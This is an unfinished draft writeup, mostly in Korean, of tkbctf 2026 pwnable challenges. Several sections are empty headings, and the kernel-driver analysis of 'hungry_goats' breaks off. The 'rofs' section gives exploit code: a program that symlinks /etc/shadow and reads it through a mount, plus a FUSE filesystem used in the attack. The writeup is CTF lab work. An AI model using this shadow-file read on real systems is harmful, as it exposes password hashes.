---
title: 2026-tkbctf-pwnable
title_ko: 2026-tkbctf-pwnable
lang: en
draft: true
date: 2026-03-17
tags:
  - writeup
description: 2026-tkbctf pwnable challenges writeup
description_ko: 2026-tkbctf pwnable challenges writeup
---
[lang:ko]

# Stack BOF

# BSS BOF

# PyFSB

# hungry_goats
## 문제 분석
### 초기화
동일한 `struct file_operations` 를 사용하는 두 개의 misc device를 추가하고 있다. 

보통 CTF에서 하나의 device를 제공하는데, 이 문제에서는 두 device를 제공하는 것을 보면 두 device를 잘 엮어서 취약점을 트리거해야 하는 문제인가? 라는 생각을 했다.
```c

static void goat_ep_init(struct goat_endpoint *ep, const char *name) {
  memset(ep, 0, sizeof(*ep));

  ep->name = name;
  ep->miscdev.minor = MISC_DYNAMIC_MINOR;
  ep->miscdev.name = (char *)name;
  ep->miscdev.fops = &goat_fops;
  ep->miscdev.mode = 0666;

  skb_queue_head_init(&ep->rx_q);
}

static int __init goats_init(void) {
  int ret;

  goat_ep_init(&white_ep, "white_goat");
  goat_ep_init(&black_ep, "black_goat");

  white_ep.peer = &black_ep;
  black_ep.peer = &white_ep;

  ret = misc_register(&white_ep.miscdev);
  if (ret) {
    pr_err("hungry_goats: misc_register failed: %d\n", ret);
    return ret;
  }

  ret = misc_register(&black_ep.miscdev);
  if (ret) {
    pr_err("hungry_goats: misc_register failed: %d\n", ret);
    misc_deregister(&white_ep.miscdev);
    return ret;
  }

  pr_info("hungry_goats: loaded\n");
  return 0;
}
```

## file_operations
read, write, ioctl 3가지 operation을 사용할 수 있다.

```c
static const struct file_operations goat_fops = {
    .owner = THIS_MODULE,
    .read = goat_read,
    .write = goat_write,
    .unlocked_ioctl = goat_ioctl,
};
```

## goat_write
```c
static ssize_t goat_write(struct file *file, const char __user *buf, size_t len,
                          loff_t *ppos) {
  struct goat_endpoint *ep = file_to_ep(file);
  struct goat_endpoint *peer = ep->peer;
  char signature[SIGNATURE_SIZE] = {0};
  struct sk_buff *clone = NULL;
  struct sk_buff *skb = NULL;
  unsigned char *data;
  struct page *page;
  void *kaddr;
  int ret;

  mutex_lock(&g_lock);

  skb = alloc_skb(len, GFP_KERNEL);
  if (!skb) {
    ret = -ENOMEM;
    goto out;
  }

  data = skb_put(skb, len);
  skb->data_len += len;
  if (copy_from_user(data, buf, len)) {
    kfree_skb(skb);
    ret = -EFAULT;
    goto out;
  }

  page = alloc_page(GFP_KERNEL);
  if (!page) {
    kfree_skb(skb);
    ret = -ENOMEM;
    goto out;
  }

  snprintf(signature, sizeof(signature), "%s: ", ep->name);
  kaddr = kmap_local_page(page);
  memcpy(kaddr, signature, SIGNATURE_SIZE);
  kunmap_local(kaddr);

  skb_fill_page_desc(skb, skb_shinfo(skb)->nr_frags, page, 0, SIGNATURE_SIZE);
  skb->len += SIGNATURE_SIZE;
  skb->data_len += SIGNATURE_SIZE;

  clone = skb_clone(skb, GFP_KERNEL);
  if (!clone) {
    kfree_skb(skb);
    ret = -ENOMEM;
    goto out;
  }

  if (ep->last_skb)
    kfree_skb(ep->last_skb);
  ep->last_skb = skb;

  skb_queue_tail(&peer->rx_q, clone);
  ret = len;
out:
  mutex_unlock(&g_lock);
  return ret;
}
```
``

# rofs
```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

char buf[0x1000];

void fatal(const char *msg) 
{
    perror(msg);
    exit(EXIT_FAILURE);
}

int main(void)
{
    int ret;
    int fd;

    ret = symlink("/etc/shadow", "/tmp/mirror/shadow");
    if (ret < 0)
        fatal("symlink");
    
    fd = open("/home/ctf/mnt/shadow", O_RDONLY);
    if (fd < 0)
        fatal("open");

    ret = read(fd, buf, sizeof(buf));
    if (ret < 0)
        fatal("read");

    write(STDOUT_FILENO, buf, ret);

    return 0;
}
```
![[Pasted image 20260318160121.png]]

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>

#define FUSE_USE_VERSION FUSE_MAKE_VERSION(3, 18)
#include <fuse3/fuse.h>

char buf[0x1000];

void fatal(const char *msg) 
{
    perror(msg);
    exit(EXIT_FAILURE);
}

int expfs_getattr(const char *path, struct stat *st, struct fuse_file_info *fi)
{
    memset(st, 0, sizeof(*st));
    if (lstat(path, st) < 0) 
        return -errno;

    return 0;
}

int expfs_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi, enum fuse_readdir_flags flags) 
{
    DIR *dp = opendir(path);
    if (!dp) 
        return -errno;

    filler(buf, ".", NULL, 0, 0);
    filler(buf, "..", NULL, 0, 0);

    struct dirent *de;
    while ((de = readdir(dp)) != NULL)
        if (filler(buf, de->d_name, NULL, 0, 0) != 0) break;
    closedir(dp);
    return 0;
}

int expfs_open(const char *path, struct fuse_file_info *fi) {
    int fd = open(path, fi->flags);
    if (fd < 0) 
        return -errno;
    fi->fh = (uint64_t)fd;
    return 0;
}

#define MAX_SIZE 0x1000
#define MIN(a, b) ((a) < (b) ? (a) : (b))
ssize_t file_size(int fd) {
  struct stat st;
  if (fstat(fd, &st) < 0 || MAX_SIZE <= st.st_size) exit(1);
  return st.st_size;
}

int expfs_read(const char *_path, char *buf, size_t blen, off_t off, struct fuse_file_info *fi) {
  char *read_buf = calloc(file_size(fi->fh), 1);
  ssize_t req = file_size(fi->fh) - off, got = 0;

  while (got < req) {
    ssize_t n = pread(fi->fh, &read_buf[got], req - got, off + (off_t)got);
    if (n <= 0) break;
    got += n;
  }

  memcpy(buf, read_buf, MIN(got, blen));
  free(read_buf);
  return MIN(got, blen);
}

struct fuse_operations expfs_fops = {
    .getattr = expfs_getattr,
    .readdir = expfs_readdir,
    .open = expfs_open,
    .read = expfs_read,
};

int main(int argc, char *argv[])
{
    struct fuse_args args = FUSE_ARGS_INIT(argc, argv);
    int ret;

    ret = fuse_main(args.argc, args.argv, &expfs_fops, NULL);
    if (ret < 0)
        fatal("fuse_main");

    return ret;
}
```
![[Pasted image 20260318162247.png]]

[lang:en]

# English
